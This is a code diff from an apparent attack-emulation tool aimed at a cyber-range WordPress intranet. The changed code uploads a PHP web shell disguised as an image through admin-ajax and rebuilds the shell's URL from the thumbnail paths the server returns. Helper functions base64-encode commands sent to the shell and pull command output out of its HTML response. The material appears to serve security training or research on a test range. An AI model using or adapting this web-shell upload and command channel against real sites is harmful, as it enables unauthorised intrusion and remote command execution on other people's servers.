@@ -476,10 +476,34 @@ class UploadWebShell:
                 log.info("Uploading web shell")
                 response = session.post(self.admin_ajax, data=data, files=files)
                 json = response.json()
-                context.web_shell = (
+
+                # The returned URL might be of any of the following formats
+                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-150x150.php
+                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-225x300.php
+                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-768x1024.php
+                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-scaled.jpg
+                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333.php
+                # but only the full sized image url will work as such we have parse the directory path
+                # and image timestamp from the returned url and reconstruct the URL for the fullsized image
+                url_regex: Pattern = re.compile(
+                    # directory path
+                    r"(http[s]:\/\/.*\/)("
+                    # timestamped name has format <name>-<floating point epoch> e.g., special-1615472044.7333
+                    + self.image_name.replace(".php", "")
+                    + r"-\d*\.\d*).*\.(php|jpg)"
+                )
+                url_raw = (
                     json.get("data").get("previewsData").get("images")[0].get("url")
                 )
-                log.info("Uploaded web shell", web_shell=context.web_shell)
+
+                url_match = url_regex.match(url_raw)
+                if url_match is not None:
+                    # rebuild image url from directory path and timestamped name
+                    context.web_shell = url_match.group(1) + url_match.group(2) + ".php"
+                    log.info("Uploaded web shell", web_shell=context.web_shell)
+                else:
+                    log.error("Invalid web shell url", url_raw=url_raw)
+                    raise Exception("Web shell upload error")
             else:
                 log.error("Unable to retrieve nonce")
         else:
@@ -498,7 +522,7 @@ def encode_cmd(cmd: List[str]) -> str:
     return base64.b64encode(json.dumps(cmd).encode("utf-8")).decode("utf-8")
 
 
-def decode_response(response: str) -> List[str]:
+def decode_response(response: Union[str, bytes]) -> List[str]:
     """Extracts the web shell command output from the HTML response
 
     Args:
@@ -507,6 +531,13 @@ def decode_response(response: str) -> List[str]:
     Returns:
         The command output as list of lines
     """
+    # trim the response to the html area since
+    # soup might have some issues with image bytes
+    if isinstance(response, bytes):
+        response = response[response.find(b"<html>") :]
+    else:
+        response = response[response.find("<html>") :]
+
     soup = BeautifulSoup(response, "html.parser")
     for tag in soup.findAll(name="meta", attrs={"name": "info"}):
         if tag.has_attr("data"):
